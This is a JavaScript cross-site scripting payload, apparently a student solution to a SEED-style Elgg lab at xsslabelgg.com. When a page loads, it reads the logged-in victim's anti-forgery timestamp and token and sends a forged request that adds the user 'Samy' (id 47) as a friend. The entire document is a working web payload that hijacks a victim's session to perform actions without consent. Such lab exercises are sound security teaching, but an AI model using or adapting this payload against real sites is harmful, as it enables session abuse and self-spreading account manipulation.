<script type="text/javascript">
	window.onload = function () {
	var Ajax=null;
	var ts="&__elgg_ts="+elgg.security.token.__elgg_ts;
	var token="&__elgg_token="+elgg.security.token.__elgg_token;
        var id = elgg.session.user.guid; // user id
	
	//Construct the HTTP request to add Samy as a friend.

	//actual request url example for adding Sammy as friend, got from the inspect mode of the browser.
	//http://www.xsslabelgg.com/action/friends/add?friend=47&__elgg_ts=1624467876&__elgg_token=vW7NX1gvAKw9e0YZoJ5Tfw
	
	var sendurl= "http://www.xsslabelgg.com/action/friends/add?friend=47" + ts + token; //FILL IN

	// user id of Sammy is 47.	
	if ( id != 47){	
		//Create and send Ajax request to add friend
		Ajax=new XMLHttpRequest();
		Ajax.open("GET",sendurl,true);
		Ajax.setRequestHeader("Host","www.xsslabelgg.com");
		Ajax.setRequestHeader("Content-Type","application/x-www-form-urlencoded");
		Ajax.send();
	}
	}
</script>
